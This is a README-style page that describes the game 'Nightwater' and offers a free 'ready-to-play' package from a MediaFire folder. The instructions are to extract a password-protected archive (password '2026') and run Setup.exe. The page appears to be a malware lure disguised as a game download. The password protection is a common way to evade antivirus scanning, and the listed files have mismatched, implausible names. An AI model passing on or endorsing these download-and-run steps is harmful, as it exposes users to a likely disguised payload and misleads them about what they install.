## 🕹️ About

Nightwater is a single-player adventure, simulation, strategy, and automation game developed by Studio Ashty and published by Studio Ashty and Irox Games. You awaken on a solitary island floating across a sea of liquid void and starlight, with a mysterious lighthouse as your ultimate destination. Gather resources, craft tools, build production chains, automate factories, and expand the island by manifesting new biomes. Progress from sticks and stones through the Bronze Age, Industrial Era, and future technology while uncovering optional secrets, minigames, and four possible endings. This ready-to-play release is packaged for quick setup: unpack, run, and play.

Nightwater is for players who enjoy relaxed resource management, factory building, exploration, incremental progression, and atmospheric mysteries.

## ✨ Features

- 🌌 **Mysterious Island** — Explore a solitary island surrounded by liquid void, starlight, fog, and mountains.
- 🎮 **Optional Minigames** — Play five distinct minigames to earn buildings, crafts, buffs, and upgrades.
- 🔦 **Hidden Story** — Piece together clues surrounding Nightwater and uncover four different endings.
- ⚙️ **Era Progression** — Advance from primitive tools to industrial machinery and futuristic technology.
- 🧭 **Biome Expansion** — Manifest new biomes to discover unique resources, secrets, and progression paths.
- 🏭 **Factory Automation** — Construct machines, connect production chains, and automate resource processing.

### Step 1: Download

Download the ready-to-play package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- license.bank <- License data
|-- dlc.md5 <- DLC checksums
|-- installer.dat <- Installer data
|-- bootstrap.wem <- Bootstrap audio
|-- res.pak <- Resources archive
|-- license.wem <- Audio assets
|-- launcher.dll <- Launcher library
|-- global.cfg <- Global settings
|-- settings.bin <- Configuration
|-- assets.wem <- Asset audio
|-- uninstall.key <- Uninstall key
|-- update_1.res <- Update resources
|-- driver.umap <- Driver data
|-- api.pak <- API modules
|-- audio.res <- Audio resources
|-- driver.pak <- Driver archive
|-- physics.sys <- Physics engine
|-- localization.ini <- Language files
|-- patch_1.bnk <- Audio banks
|-- Password 2026.txt <- Password reminder (empty)
|-- scripts.lic <- Game scripts
|-- lang.sys <- Language system
|-- animations.dll <- Animation system
|-- update_1.ini <- Update config
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game is ready to play
